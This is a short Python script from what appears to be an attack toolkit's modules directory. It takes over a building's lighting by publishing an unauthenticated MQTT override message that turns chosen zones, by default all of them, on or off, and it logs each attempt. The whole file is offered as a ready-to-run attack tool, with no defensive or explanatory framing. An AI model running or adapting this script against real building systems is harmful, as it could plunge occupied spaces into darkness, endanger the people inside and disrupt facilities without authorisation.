#!/usr/bin/env python3
# modules/attacks/lighting_system_overrider.py

import time
import argparse
import paho.mqtt.publish as publish
import os
import json

LOG = "results/lighting_override.log"
TOPIC = "building/lighting/override"
BROKER = "127.0.0.1"

def log(msg):
    os.makedirs("results", exist_ok=True)
    with open(LOG, "a") as f:
        f.write(f"{time.ctime()} | {msg}\n")
    print(msg)

def override_lights(state="off", zone="all"):
    payload = {
        "zone": zone,
        "override": True,
        "state": state,
        "timestamp": time.time()
    }
    try:
        publish.single(TOPIC, json.dumps(payload), hostname=BROKER)
        log(f"Sent override: {payload}")
    except Exception as e:
        log(f"[ERROR] MQTT publish failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Override lighting system via MQTT")
    parser.add_argument("--state", choices=["on", "off"], default="off", help="Desired light state")
    parser.add_argument("--zone", default="all", help="Target zone or 'all'")
    args = parser.parse_args()
    override_lights(args.state, args.zone)
